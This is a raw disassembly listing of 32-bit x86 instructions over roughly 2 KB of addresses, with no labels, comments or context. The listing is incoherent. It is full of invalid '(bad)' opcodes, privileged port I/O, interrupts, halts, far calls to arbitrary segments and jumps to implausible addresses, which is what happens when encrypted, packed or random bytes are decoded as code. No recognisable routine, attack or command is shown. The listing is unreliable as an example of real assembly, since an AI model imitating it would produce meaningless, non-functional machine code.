  404e6e:	mov    edx,0x9a9668c
  404e73:	out    0xb0,al
  404e75:	add    DWORD PTR [edi+edx*8-0x7b7df97e],edx
  404e7c:	pop    ss
  404e7d:	ins    DWORD PTR es:[edi],dx
  404e7e:	and    ch,bl
  404e80:	push   esi
  404e81:	int    0x1b
  404e83:	or     BYTE PTR [eax],ah
  404e85:	mov    eax,0xbc203c04
  404e8a:	test   BYTE PTR [ecx+0xbb72cac],dh
  404e90:	cmp    al,0xfe
  404e92:	cmp    al,BYTE PTR [edx+ecx*1]
  404e95:	jae    0x404ea6
  404e97:	fimul  DWORD PTR ds:0x4da62a6
  404e9d:	inc    edx
  404e9e:	jmp    0x404e8a
  404ea0:	sub    BYTE PTR ds:0x8a376744,cl
  404ea6:	push   cs
  404ea7:	neg    BYTE PTR [edi-0x7]
  404eaa:	or     BYTE PTR [ebx],0xfe
  404ead:	adc    esp,DWORD PTR [esi]
  404eaf:	push   ebx
  404eb0:	push   cs
  404eb1:	inc    esi
  404eb2:	imul   edx,edx,0xa
  404eb5:	push   ds
  404eb6:	cmp    edx,0xa08363f4
  404ebc:	jnp    0x404e4e
  404ebe:	jb     0x404eaa
  404ec0:	aaa    
  404ec1:	add    ch,BYTE PTR [eax+0x2b]
  404ec4:	call   0x3c0:0xef1e95b4
  404ecb:	push   0xf
  404ecd:	dec    esp
  404ece:	push   ebp
  404ecf:	fmul   st(6),st
  404ed1:	sub    BYTE PTR [esi],ah
  404ed3:	inc    esp
  404ed4:	rcl    BYTE PTR [esp+ebx*1+0x4cc88b84],0x47
  404edc:	pop    eax
  404edd:	leave  
  404ede:	push   cs
  404edf:	push   ss
  404ee0:	pop    ebx
  404ee1:	fild   WORD PTR [eax+0xe]
  404ee4:	jb     0x404ef1
  404ee6:	pop    edi
  404ee7:	add    BYTE PTR [ecx-0x6d85f2ff],dh
  404eed:	cdq    
  404eee:	or     BYTE PTR [ebx-0x52a749b3],ah
  404ef4:	(bad)  
  404ef6:	mov    bl,0x6f
  404ef8:	test   bh,ch
  404efa:	sbb    al,0x3d
  404efc:	std    
  404efd:	inc    edi
  404efe:	dec    ebp
  404eff:	push   es
  404f00:	aam    0xd6
  404f02:	fld    TBYTE PTR [esp]
  404f05:	fstp   QWORD PTR [esi]
  404f07:	fwait
  404f08:	leave  
  404f09:	add    al,0x4c
  404f0b:	gs adc al,0x57
  404f0e:	fld    DWORD PTR [esi]
  404f10:	dec    ebx
  404f11:	pop    esi
  404f12:	ins    BYTE PTR es:[edi],dx
  404f13:	out    0xb1,eax
  404f15:	add    DWORD PTR [esi-0x5f],edi
  404f18:	pop    ebp
  404f19:	mov    fs:0x45ddc22c,al
  404f1f:	or     BYTE PTR [edx+0x70],al
  404f22:	daa    
  404f23:	inc    edi
  404f24:	scas   eax,DWORD PTR es:[edi]
  404f25:	clc    
  404f26:	add    BYTE PTR [ebx+0x247208ec],0x9b
  404f2d:	pop    eax
  404f2e:	pop    edx
  404f2f:	(bad)  
  404f30:	adc    edi,esi
  404f32:	ins    BYTE PTR es:[edi],dx
  404f33:	jp     0x404eeb
  404f35:	fnsave [ebx-0x14ebcd8c]
  404f3b:	push   es
  404f3c:	adc    eax,DWORD PTR ds:0x8950955a
  404f42:	adc    DWORD PTR [edx+0x64],edx
  404f45:	sub    BYTE PTR [ecx],cl
  404f47:	mov    ah,0xe6
  404f49:	or     BYTE PTR [edx],dl
  404f4b:	dec    edi
  404f4c:	sbb    eax,0x5c0ce620
  404f51:	aad    0x34
  404f53:	outs   dx,DWORD PTR ds:[esi]
  404f54:	push   edi
  404f55:	sbb    BYTE PTR cs:[ebx+0x4d],dh
  404f59:	or     bh,dl
  404f5b:	cmp    al,0x73
  404f5d:	inc    edi
  404f5e:	stc    
  404f5f:	inc    ecx
  404f60:	out    dx,eax
  404f61:	cli    
  404f62:	es test esp,ebp
  404f65:	sahf   
  404f66:	jae    0x404fa2
  404f68:	movzx  eax,ax
  404f6b:	data16 sub dh,0x36
  404f6f:	add    bl,dl
  404f71:	cmp    ah,BYTE PTR [ecx+0x69d2106f]
  404f77:	shl    BYTE PTR [eax-0x16],cl
  404f7a:	out    dx,al
  404f7b:	ret    0xd114
  404f7e:	mov    esi,0xe864505c
  404f83:	add    esi,DWORD PTR [edx-0xac246c]
  404f89:	xor    bl,dh
  404f8b:	add    al,0xd8
  404f8d:	xor    eax,0x8e6823c
  404f92:	fstp   QWORD PTR [eax]
  404f94:	fwait
  404f95:	add    BYTE PTR [edi-0x16],bl
  404f98:	aam    0xc6
  404f9a:	mov    dh,0x5e
  404f9c:	mov    ebp,0xba2404c2
  404fa1:	push   ss
  404fa2:	retf   
  404fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fa4:	dec    esp
  404fa5:	outs   dx,DWORD PTR ds:[esi]
  404fa6:	mov    bl,0x24
  404fa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fa9:	hlt    
  404faa:	xchg   ebx,eax
  404fab:	je     0x404fac
  404fad:	jne    0x404fbf
  404faf:	mov    edx,0xc0f1abec
  404fb4:	cwde   
  404fb5:	mov    ah,0x71
  404fb7:	mov    BYTE PTR [ebp+ecx*4+0x4d],ah
  404fbb:	(bad)  
  404fbc:	mov    dx,0x96c6
  404fc0:	iret   
  404fc1:	jl     0x404fd6
  404fc3:	loopne 0x40501f
  404fc5:	int3   
  404fc6:	push   esi
  404fc7:	mov    ecx,ebx
  404fc9:	push   ds
  404fca:	cmp    al,0x0
  404fcc:	pop    eax
  404fcd:	ss scas eax,DWORD PTR es:[edi]
  404fcf:	pop    ss
  404fd0:	test   edi,0x3e8fc24
  404fd6:	jmp    0x570c:0xb55cc3ad
  404fdd:	enter  0xc132,0x83
  404fe1:	loopne 0x404fe6
  404fe3:	fild   QWORD PTR [ebx+0x212835a1]
  404fe9:	adc    bl,cl
  404feb:	ins    BYTE PTR es:[edi],dx
  404fec:	mov    esi,0xf7d23321
  404ff1:	test   BYTE PTR [ebp-0x12345a53],0xd2
  404ff8:	jne    0x40500e
  404ffa:	sbb    al,0xb9
  404ffc:	nop
  404ffd:	add    ecx,esi
  404fff:	and    BYTE PTR [ebp-0x509b3f7e],dl
  405005:	das    
  405006:	jbe    0x404f8c
  405008:	adc    DWORD PTR [edi+0x720719b5],0xffffff98
  40500f:	loope  0x404fe2
  405011:	fcomp  st(6)
  405013:	pushf  
  405014:	jg     0x404fa3
  405016:	add    al,0x40
  405018:	add    al,0xc5
  40501a:	aam    0x5f
  40501c:	es (bad) 
  40501e:	loope  0x404fde
  405020:	inc    BYTE PTR cs:[ecx]
  405023:	jb     0xf76feb7
  405029:	daa    
  40502a:	ja     0x2e3b9db3
  405030:	xor    BYTE PTR [ecx+0xa7d72d2],ah
  405036:	or     al,0x77
  405038:	ja     0x405050
  40503a:	sti    
  40503b:	jno    0x4050b5
  40503d:	call   ebx
  40503f:	push   0xfffffffc
  405041:	(bad)  
  405042:	nop
  405043:	cmp    ebx,DWORD PTR [edx+eax*2-0x2]
  405047:	ja     0x4050ad
  405049:	sbb    BYTE PTR [eax-0x1],cl
  40504c:	pop    ebp
  40504d:	stos   DWORD PTR es:[edi],eax
  40504e:	sar    DWORD PTR [esi+0x11],0xbb
  405052:	sub    al,0x3
  405054:	pop    esp
  405055:	dec    edx
  405056:	inc    BYTE PTR [ecx+0x48]
  405059:	inc    ecx
  40505b:	mov    ebp,DWORD PTR [ebp+0x49ced075]
  405061:	mov    eax,ecx
  405063:	dec    ebx
  405064:	cdq    
  405065:	idiv   esi
  405067:	imul   esi,ecx,0xe041c76d
  40506d:	push   eax
  40506e:	cs ror ebp,1
  405071:	add    ebp,DWORD PTR [ebp-0xd13f123]
  405077:	sub    esi,eax
  405079:	ds ins DWORD PTR es:[edi],dx
  40507b:	ds stc 
  40507d:	add    esi,eax
  40507f:	pop    esi
  405080:	ret    
  405081:	or     BYTE PTR [ecx-0x744f97a0],al
  405087:	out    dx,al
  405088:	xchg   DWORD PTR [edx-0x24],edi
  40508b:	hlt    
  40508c:	shr    DWORD PTR [ebx],1
  40508e:	and    eax,DWORD PTR [ebp+0xcdfefd0]
  405094:	inc    edx
  405095:	and    BYTE PTR [ecx-0x1c],cl
  405098:	mov    ah,0xd1
  40509a:	push   eax
  40509b:	sbb    bh,BYTE PTR [edi]
  40509d:	xor    ah,ah
  40509f:	dec    ebp
  4050a0:	call   0xf0c01a2a
  4050a5:	in     eax,0xa4
  4050a7:	popf   
  4050a8:	leave  
  4050a9:	mov    ah,bh
  4050ab:	push   cs
  4050ac:	clc    
  4050ad:	hlt    
  4050ae:	ror    DWORD PTR [edx],0x38
  4050b1:	mov    ah,0x8
  4050b3:	add    edx,DWORD PTR [ebp+0x6e]
  4050b6:	je     0x4050a1
  4050b8:	inc    edx
  4050b9:	or     BYTE PTR [ebp+0x4207c8c0],0x36
  4050c0:	dec    ecx
  4050c1:	data16 lock jo 0x4050c4
  4050c5:	fwait
  4050c6:	inc    esi
  4050c7:	cmp    ecx,0x23ab1
  4050cd:	jl     0x4050e2
  4050cf:	sub    ecx,0xa2c3120e
  4050d5:	adc    ebp,ebp
  4050d7:	dec    esp
  4050d8:	inc    esp
  4050d9:	and    eax,0xf2c0ed7d
  4050de:	pop    esi
  4050df:	lock scas al,BYTE PTR es:[edi]
  4050e1:	or     bh,BYTE PTR [ebp-0x7153c148]
  4050e7:	xchg   ecx,eax
  4050e8:	inc    ecx
  4050e9:	data16 mov es,WORD PTR [esi+ebx*4]
  4050ed:	sbb    bl,dl
  4050ef:	in     ax,dx
  4050f1:	dec    WORD PTR [ebp+0x28]
  4050f5:	cmp    DWORD PTR [eax],0x3c6b662c
  4050fb:	fs push es
  4050fd:	fmul   st,st(2)
  4050ff:	ss pop ss
  405101:	not    BYTE PTR [ebx+0x28]
  405104:	call   0x10cc:0x5905b5f2
  40510b:	fimul  DWORD PTR [ebp+0x2e0c12c]
  405111:	cmp    esi,DWORD PTR [eax]
  405113:	xchg   ebp,eax
  405114:	loop   0x405166
  405116:	int    0x2
  405118:	sub    cl,BYTE PTR [esi+0x5d]
  40511b:	add    DWORD PTR [ebx],0x50b52545
  405121:	mov    edx,eax
  405123:	mov    dl,0x57
  405126:	in     al,dx
  405127:	fwait
  405128:	inc    eax
  405129:	dec    ebp
  40512a:	mov    eax,ds:0xc87eb866
  40512f:	and    BYTE PTR [esp+ecx*2+0x704d6a4e],ch
  405136:	sbb    eax,0xee6c898a
  40513b:	pushf  
  40513c:	cmp    ecx,DWORD PTR [esi]
  40513e:	jb     0x405172
  405140:	outs   dx,BYTE PTR ds:[esi]
  405141:	sahf   
  405142:	dec    ebx
  405143:	stos   BYTE PTR es:[edi],al
  405144:	sbb    ch,BYTE PTR [ecx]
  405146:	inc    eax
  405147:	jmp    0x405125
  405149:	dec    ebx
  40514a:	inc    eax
  40514b:	or     al,0xf5
  40514d:	jecxz  0x405168
  40514f:	jo     0x40514b
  405151:	sar    DWORD PTR [eax],1
  405153:	int    0x4
  405155:	add    BYTE PTR [esp+edx*1],ah
  405158:	hlt    
  405159:	cmp    esi,DWORD PTR [esp+ecx*2-0x29]
  40515d:	jl     0x4051b6
  40515f:	push   ecx
  405160:	mov    esp,0xd1047ef0
  405165:	mov    edi,0xfe4c2f80
  40516a:	cmc    
  40516b:	jae    0x405111
  40516d:	pop    esi
  40516e:	mov    ch,0xe8
  405170:	mov    al,0xd5
  405172:	(bad)  
  405173:	daa    
  405174:	cmp    eax,0x6a64e8f8
  405179:	xor    ebx,DWORD PTR [ebp+edx*4-0x6904604]
  405180:	xchg   edx,eax
  405181:	inc    eax
  405182:	or     DWORD PTR [ecx],eax
  405184:	aas    
  405185:	aad    0x0
  405187:	mov    eax,0x66704e54
  40518c:	lea    ecx,[eax]
  40518e:	push   ebp
  40518f:	dec    edi
  405190:	sub    DWORD PTR [eax],edx
  405192:	(bad)  
  405193:	call   0x4003:0x3f407dbb
  40519a:	sub    ebx,DWORD PTR [ecx-0x4f2cfb04]
  4051a0:	mov    edx,0xda9825d1
  4051a5:	test   BYTE PTR [edx],bl
  4051a7:	jmp    0x88fbf158
  4051ac:	xchg   edx,eax
  4051ad:	and    eax,0x11948d40
  4051b2:	ds inc eax
  4051b4:	test   esp,0x88d2290
  4051ba:	add    DWORD PTR [eax-0x163ca4cd],ebx
  4051c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051c1:	adc    al,0x6f
  4051c3:	add    al,0x3b
  4051c5:	or     ebx,ebx
  4051c7:	fild   QWORD PTR [edx]
  4051c9:	ret    
  4051ca:	adc    DWORD PTR [ebp+0x50],esi
  4051cd:	pop    ecx
  4051ce:	aas    
  4051cf:	mov    cs,WORD PTR [esi-0x64492891]
  4051d5:	dec    edx
  4051d6:	push   0x4
  4051d8:	jle    0x4051ba
  4051da:	ins    BYTE PTR es:[edi],dx
  4051db:	mov    cl,BYTE PTR [esi+edx*2-0x17ff1b60]
  4051e2:	or     al,0xec
  4051e4:	and    al,0xe0
  4051e6:	mov    edx,0x6a046d78
  4051eb:	mov    ecx,0xba764278
  4051f0:	retf   0x35ee
  4051f3:	push   cs
  4051f4:	loopne 0x4051ab
  4051f6:	rcr    BYTE PTR [edi+ecx*4],1
  4051f9:	ss push ss
  4051fb:	call   0x4f77e70b
  405200:	or     edx,esp
  405202:	jno    0x4051cc
  405204:	test   al,0x10
  405206:	add    bl,ch
  405208:	add    dl,BYTE PTR [esi+0x10]
  40520b:	fadd   DWORD PTR ds:0x128ac1fb
  405211:	inc    edx
  405212:	cmp    dl,BYTE PTR [ecx-0x5]
  405215:	je     0x4051d7
  405217:	cwde   
  405218:	cld    
  405219:	inc    eax
  40521a:	sti    
  40521b:	in     eax,dx
  40521c:	add    BYTE PTR [esi],bh
  40521e:	jo     0x4051a9
  405220:	inc    edx
  405221:	hlt    
  405222:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405223:	pop    esp
  405224:	cmp    BYTE PTR [eax-0x13],0x8a
  405228:	mov    ch,0x45
  40522a:	inc    esi
  40522b:	inc    eax
  40522c:	sub    cl,BYTE PTR [edi]
  40522e:	adc    dh,BYTE PTR [eax+0xc]
  405231:	add    al,0x8
  405233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405235:	mov    bh,0xfb
  405237:	push   ss
  405238:	lea    ecx,[eax-0x12]
  40523b:	or     edx,DWORD PTR [eax-0x10]
  40523e:	lahf   
  40523f:	push   0xecc33474
  405244:	lea    esp,[ebp+0x1ed40c6]
  40524a:	jb     0x4052bb
  40524c:	jecxz  0x40527f
  40524e:	jb     0x405249
  405250:	mov    dh,0x85
  405252:	push   esi
  405253:	in     al,0x50
  405255:	jge    0x40523d
  405257:	call   0xe80c2321
  40525c:	jmp    0xb84f:0x1e33c72
  405263:	bound  eax,QWORD PTR [ecx]
  405265:	out    0xe4,eax
  405267:	dec    BYTE PTR [eax+0x403a138d]
  40526d:	arpl   WORD PTR [ebp+0x0],si
  405270:	cld    
  405271:	in     al,0x71
  405273:	xchg   DWORD PTR [esp+ebx*2+0x46],esi
  405277:	dec    ebp
  405278:	jno    0x4052ea
  40527a:	cmp    BYTE PTR [eax-0x38],al
  40527d:	xor    edx,DWORD PTR [ebx-0x35]
  405280:	outs   dx,BYTE PTR ds:[esi]
  405281:	adc    eax,0xfb01eaf0
  405286:	add    bh,cl
  405288:	out    dx,al
  405289:	out    dx,al
  40528a:	pop    eax
  40528b:	mov    edx,0x866a8814
  405290:	jmp    0x40694f9d
  405295:	push   0xc5e83f00
  40529a:	loope  0x4052c4
  40529c:	xchg   esp,eax
  40529d:	fwait
  40529e:	in     al,dx
  40529f:	call   0x373b1256
  4052a4:	jp     0x405251
  4052a6:	test   al,0x1b
  4052a8:	push   eax
  4052a9:	push   0x6bae32a5
  4052ae:	jo     0x40525b
  4052b0:	outs   dx,BYTE PTR ds:[esi]
  4052b1:	xchg   ebp,eax
  4052b2:	push   ebp
  4052b3:	mov    ecx,0xbf02806a
  4052b8:	dec    DWORD PTR [ebx+0x4e]
  4052bb:	jne    0x3ce1834d
  4052c1:	outs   dx,BYTE PTR ds:[si]
  4052c3:	inc    eax
  4052c4:	lds    ebp,FWORD PTR [ebp+0x8221412]
  4052ca:	or     eax,0x3867d75
  4052cf:	mov    al,0x35
  4052d1:	inc    edi
  4052d2:	sahf   
  4052d3:	inc    ecx
  4052d4:	mov    al,ds:0xa1bc89c
  4052d9:	sti    
  4052da:	std    
  4052db:	add    DWORD PTR [ebp+0x403d8360],edi
  4052e1:	pop    eax
  4052e2:	add    DWORD PTR [ebp+0x57],esi
  4052e5:	sub    al,0xc5
  4052e7:	jns    0x405284
  4052e9:	mov    edi,ds
  4052eb:	adc    DWORD PTR [ebx+0x42759a20],ebx
  4052f1:	jb     0x4052f6
  4052f3:	add    eax,0x343b3c03
  4052f8:	fld    DWORD PTR [ebx]
  4052fa:	ret    0x5e48
  4052fd:	inc    esi
  4052fe:	in     al,0x3d
  405300:	jae    0x4052f3
  405302:	cmp    ch,al
  405304:	sahf   
  405305:	sbb    esp,DWORD PTR cs:[edx]
  405308:	mov    esp,0xc7102763
  40530d:	ret    
  40530e:	aaa    
  40530f:	into   
  405310:	xor    DWORD PTR fs:[ecx+0x40],0x6b
  405315:	enter  0xc76d,0xc4
  405319:	imul   edi,DWORD PTR [ecx+esi*1],0x8311e5db
  405320:	cmp    eax,0x6757200a
  405325:	addr16 push es
  405327:	xlat   BYTE PTR ds:[ebx]
  405328:	inc    edx
  405329:	pop    esi
  40532a:	ret    
  40532b:	in     al,0xec
  40532d:	retf   
  40532e:	test   BYTE PTR [eax+0x39264980],0xec
  405335:	out    dx,al
  405336:	repnz loope 0x405302
  405339:	push   cs
  40533a:	stos   DWORD PTR es:[edi],eax
  40533b:	adc    al,0x7f
  40533d:	pmullw mm1,QWORD PTR [ecx+ecx*4]
  405341:	jmp    0x405350
  405343:	mov    ecx,0xf3d90990
  405348:	sbb    BYTE PTR [ecx-0x5bd81314],cl
  40534e:	ret    
  40534f:	and    DWORD PTR [ebx+esi*1-0x15],esi
  405353:	in     al,dx
  405354:	jne    0x405374
  405356:	ret    
  405357:	popa   
  405358:	clc    
  405359:	or     eax,0x3038804e
  40535e:	jne    0x405377
  405360:	push   ebx
  405361:	mov    eax,ecx
  405363:	dec    ecx
  405364:	retf   0x8e70
  405367:	and    eax,ecx
  405369:	add    al,BYTE PTR [edi]
  40536b:	std    
  40536c:	push   ds
  40536d:	or     cl,0x45
  405370:	icebp  
  405371:	lock out dx,eax
  405373:	jns    0x4053ee
  405375:	add    cl,bh
  405377:	sub    DWORD PTR [esi-0x7],0x1b0417
  40537e:	(bad)  
  40537f:	aam    0x11
  405381:	push   0xd472869f
  405386:	add    al,0xd8
  405388:	(bad)  
  405389:	fs sub ebp,eax
  40538c:	mov    ?,WORD PTR [ebp+0x53]
  40538f:	(bad)  
  405390:	nop
  405391:	mov    al,ds:0x3ea1d991
  405396:	sub    al,0x5d
  405398:	pop    es
  405399:	ins    DWORD PTR es:[edi],dx
  40539a:	mov    eax,0x2382b394
  40539f:	xor    al,0x2
  4053a1:	loop   0x4053f0
  4053a3:	pop    ds
  4053a4:	inc    DWORD PTR [eax-0x54932c3a]
  4053aa:	and    al,0xe2
  4053ac:	and    BYTE PTR [esi],al
  4053ae:	in     eax,dx
  4053af:	add    bl,ah
  4053b1:	loope  0x40540d
  4053b3:	inc    edx
  4053b4:	and    DWORD PTR [ebp+0x18938078],edi
  4053ba:	mov    esp,0xc3477ab
  4053bf:	and    cl,BYTE PTR [ecx+0x405a30f]
  4053c5:	pop    esp
  4053c6:	cdq    
  4053c7:	dec    edx
  4053c8:	loopne 0x40539f
  4053ca:	jae    0x4053f3
  4053cc:	jmp    0x4053d4
  4053ce:	dec    esi
  4053cf:	pushf  
  4053d0:	jae    0x4053df
  4053d2:	fucomip st,st(2)
  4053d4:	adc    DWORD PTR [edx+0xf],ebx
  4053d7:	popf   
  4053d8:	push   0xc27d9506
  4053dd:	push   edi
  4053de:	jmp    0x5dca7750
  4053e3:	aam    0x4
  4053e5:	lahf   
  4053e6:	sub    al,0x1a
  4053e8:	jae    0x405444
  4053ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053eb:	repz push ss
  4053ed:	pushf  
  4053ee:	adc    al,0xbf
  4053f0:	inc    esi
  4053f1:	dec    ebp
  4053f2:	jne    0x4053d4
  4053f4:	xchg   ebp,eax
  4053f5:	add    BYTE PTR [esi-0x28],ch
  4053f8:	jge    0x4053dc
  4053fa:	dec    eax
  4053fb:	push   ss
  4053fc:	dec    esi
  4053fd:	mov    BYTE PTR [ebp-0x1e],bl
  405400:	mov    ebx,0xda24e9a3
  405405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405406:	fidiv  WORD PTR [esi+0x74870f38]
  40540c:	mov    edx,0x6e0c5c17
  405411:	add    BYTE PTR [edi],0x8a
  405414:	cmp    bh,0x24
  405417:	test   DWORD PTR [eax+0xc],eax
  40541a:	test   ecx,ecx
  40541c:	retf   
  40541d:	mov    ss,WORD PTR [eax+0x9]
  405420:	push   cs
  405421:	or     eax,0x3a5ff9f2
  405426:	mov    dh,0xe
  405428:	or     eax,DWORD PTR [eax]
  40542a:	or     al,0x5
  40542c:	add    eax,DWORD PTR [eax]
  40542e:	add    al,BYTE PTR [esi]
  405430:	add    al,0x7
  405432:	out    dx,eax
  405433:	popa   
  405434:	arpl   WORD PTR [edx-0x7af590f7],sp
  40543a:	or     BYTE PTR [eax+0x4f9bcf80],al
  405440:	repz jns 0x405449
  405443:	cld    
  405444:	sub    DWORD PTR [ebx+0x4e8c3b8e],ecx
  40544a:	lea    ebx,[ebx+0x7f34f3cf]
  405450:	mov    al,0xe5
  405452:	push   ss
  405453:	mov    cs,WORD PTR [edi-0x658f771]
  405459:	xor    al,0xed
  40545b:	adc    edx,DWORD PTR [eax-0x102fbbce]
  405461:	add    ebp,DWORD PTR [edx]
  405463:	jbe    0x405465
  405465:	pop    ecx
  405466:	or     eax,0xc2885930
  40546b:	pop    es
  40546c:	or     al,0x3a
  40546e:	pop    eax
  40546f:	and    edi,edi
  405471:	dec    edx
  405472:	mov    ecx,0xa78a1e09
  405477:	fyl2x  
  405479:	mov    eax,edx
  40547b:	mov    eax,ds:0xf759b475
  405480:	xchg   edi,eax
  405481:	pop    eax
  405482:	bound  ebp,QWORD PTR [edi+0x45]
  405485:	mov    edx,0x4b9d2f04
  40548a:	dec    edi
  40548b:	and    BYTE PTR [bp+si+0x55],0x8d
  405490:	pushw  es
  405492:	and    DWORD PTR [eax-0x7a8dc628],ebp
  405498:	je     0x4054f3
  40549a:	xchg   esp,eax
  40549b:	aam    0x78
  40549d:	adc    al,0xce
  40549f:	(bad)  
  4054a0:	sub    esp,esp
  4054a2:	aam    0xf4
  4054a4:	dec    eax
  4054a5:	ror    BYTE PTR [ecx-0x31547d40],0x18
  4054ac:	jmp    0x4054de
  4054ae:	sbb    DWORD PTR [edx-0x24],ebp
  4054b1:	push   edx
  4054b2:	shl    DWORD PTR [eax+0x45],0x2a
  4054b6:	add    al,0x85
  4054b8:	pushf  
  4054b9:	mov    ss,WORD PTR [edx+0x3b]
  4054bc:	inc    edi
  4054bd:	jnp    0x405454
  4054bf:	xor    ecx,esp
  4054c1:	leave  
  4054c2:	(bad)  [esi-0xd443d60]
  4054c8:	dec    eax
  4054c9:	je     0x405514
  4054cb:	add    al,0x6d
  4054cd:	jmp    0x40554e
  4054cf:	shl    BYTE PTR [ebp-0x2a10491c],0xee
  4054d6:	push   es
  4054d7:	leave  
  4054d8:	push   ebx
  4054d9:	mov    ds:0x142f9b7b,al
  4054de:	mov    esi,0x923dfcba
  4054e3:	push   edi
  4054e4:	ins    BYTE PTR es:[edi],dx
  4054e5:	dec    ebp
  4054e6:	sbb    BYTE PTR [edi-0x5f],ah
  4054e9:	test   BYTE PTR [ebx+ecx*2],cl
  4054ec:	scas   al,BYTE PTR es:[edi]
  4054ed:	popf   
  4054ee:	jne    0x405569
  4054f0:	sbb    al,0x27
  4054f2:	mov    BYTE PTR [ebx],ah
  4054f4:	test   DWORD PTR es:[edx+0x2c59685e],ecx
  4054fb:	loopne 0x40553f
  4054fd:	cmp    al,BYTE PTR [edx+eiz*1-0x4b]
  405501:	mov    esi,0xfd7c36dc
  405506:	or     al,0xb6
  405508:	stos   DWORD PTR es:[edi],eax
  405509:	cmc    
  40550a:	fcmovbe st,st(1)
  40550c:	sbb    eax,0x455f2410
  405511:	movzx  eax,BYTE PTR ds:0xe81ba681
  405518:	dec    eax
  405519:	jg     0x405532
  40551b:	js     0x40549f
  40551d:	pop    ebx
  40551e:	out    0x7f,al
  405520:	jae    0x4054dd
  405522:	and    dh,BYTE PTR [esi+eiz*2+0x8]
  405526:	add    eax,0x741a6174
  40552b:	push   cs
  40552c:	jmp    0x405590
  40552e:	sub    eax,0x61
  405531:	je     0x40553a
  405533:	jp     0x4055b1
  405535:	sub    bh,dl
  405537:	pop    es
  405538:	je     0x4055a1
  40553a:	jmp    0x405592
  40553c:	nop
  40553d:	loopne 0x405549
  40553f:	mov    edx,0x5fdd64d4
  405544:	addr16 push esi
  405546:	cmc    
  405547:	fwait
  405548:	sbb    BYTE PTR fs:[esp+ebp*1],ch
  40554c:	mov    edx,0x3032bdc
  405551:	test   eax,0xba16213c
  405556:	loopne 0x40555c
  405558:	(bad)  
  405559:	fdivrp st(4),st
  40555b:	shl    DWORD PTR [ebp+0x1d],cl
  40555e:	clc    
  40555f:	add    ebx,ebp
  405561:	pop    ss
  405562:	in     al,0xe0
  405564:	xor    al,0x1
  405566:	mov    BYTE PTR [eax],cl
  405568:	push   DWORD PTR [edx]
  40556a:	pop    es
  40556b:	mov    al,ds:0xe9387493
  405570:	dec    edx
  405571:	push   0xb
  405573:	lods   al,BYTE PTR ds:[esi]
  405574:	stos   DWORD PTR es:[edi],eax
  405575:	in     al,dx
  405576:	mov    edi,DWORD PTR [ebp-0x16]
  405579:	sar    BYTE PTR [edx],1
  40557b:	je     0x405592
  40557d:	inc    ax
  40557f:	push   es
  405580:	lea    si,[esi+0xcbff89f]
  405587:	add    bl,ch
  405589:	or     cl,BYTE PTR [eax]
  40558b:	jbe    0x405591
  40558d:	or     ch,bh
  40558f:	or     al,0x3b
  405591:	jle    0x40559d
  405593:	and    eax,DWORD PTR [ecx+0x19300780]
  405599:	adc    ebp,DWORD PTR [ebp+0x34]
  40559c:	lods   al,BYTE PTR ds:[esi]
  40559d:	(bad)  
  40559e:	(bad)  
  40559f:	adc    DWORD PTR ds:0x44c45c5f,esp
  4055a5:	pop    eax
  4055a6:	adc    al,0x61
  4055a8:	out    0x14,al
  4055aa:	imul   eax,DWORD PTR [bx+si+0x7c8e],0x2f257240
  4055b3:	push   ebx
  4055b4:	cwde   
  4055b5:	pushf  
  4055b6:	dec    edx
  4055b7:	es mov ecx,0x303cabc
  4055bd:	in     al,0x0
  4055bf:	ret    
  4055c0:	loop   0x4055ad
  4055c2:	push   0xe95a48e6
  4055c7:	retf   
  4055c8:	mov    dl,BYTE PTR [esi-0x1e]
  4055cb:	jne    0x4055f6
  4055cd:	jb     0x4055b9
  4055cf:	or     al,0xfe
  4055d1:	and    DWORD PTR [ebx+ebx*8],0xffffffe2
  4055d5:	pop    ebp
  4055d6:	cmp    DWORD PTR [ecx-0x3bb3c0bf],esp
  4055dc:	push   es
  4055dd:	add    al,0x88
  4055df:	lods   eax,DWORD PTR ds:[esi]
  4055e0:	js     0x4055f0
  4055e2:	rcl    DWORD PTR [edi+0x4c927d3b],1
  4055e8:	enter  0x2e5,0x1
  4055ec:	add    bl,BYTE PTR [esi]
  4055ee:	cld    
  4055ef:	push   es
  4055f0:	sub    BYTE PTR [ebp+0x11737d33],cl
  4055f6:	fst    DWORD PTR [eax-0x77083793]
  4055fc:	retf   
  4055fd:	jmp    0x40560e
  4055ff:	and    DWORD PTR [eax+edx*4-0x36a2c9fd],edx
  405606:	and    al,0xe8
  405608:	xor    DWORD PTR [edi-0x655a266b],ebp
  40560e:	xor    eax,0x3f08d94
  405613:	gs xchg edx,eax
  405615:	adc    esp,DWORD PTR [ecx]
  405617:	cld    
  405618:	data16 add bl,BYTE PTR [esi+0x7]
  40561c:	jo     0x230512b
  405622:	mov    al,BYTE PTR [ecx-0x4b]
  405625:	nop
  405626:	push   eax
  405627:	add    eax,0x9af34f1d
  40562c:	shr    ecx,0x52
  40562f:	adc    cl,BYTE PTR [eax+ebp*8]
  405632:	or     esp,esi
  405634:	sbb    edi,DWORD PTR [edx+eiz*4-0x762d13fd]
  40563b:	mov    eax,0xef9d2ef4
  405640:	push   ds
  405641:	loopne 0x40569b
  405643:	jo     0x6860d786
  405649:	popf   
  40564a:	mov    ecx,0x1f20b9ad
  40564f:	imul   ecx,DWORD PTR [ebx-0x74],0x5be42757
  405656:	je     0x4056d3
  405658:	inc    ebx
  405659:	mov    ebx,gs
  40565b:	gs leave 
  40565d:	mov    BYTE PTR [eax+0x51],dh
  405660:	fldpi  
  405662:	pop    ds
  405663:	or     al,0xc1
  405665:	or     ebx,DWORD PTR [edi]
  405667:	daa    
  405668:	mov    bh,0xe4
  40566a:	inc    esp
  40566b:	adc    al,0xaa
  40566e:	mov    esi,0x74dca1c5
  405673:	or     DWORD PTR [ebx+0x20],ecx
  405676:	ror    ecx,1
  405678:	mov    edx,DWORD PTR [esi]
  40567a:	sub    edx,DWORD PTR [ebp-0x24]
  40567d:	push   0xffffffd8
  40567f:	inc    bx
  405681:	inc    ebx
  405682:	push   ss
  405683:	push   esp
  405684:	jmp    0x405698
  405686:	sbb    DWORD PTR [edi+0x30],ecx
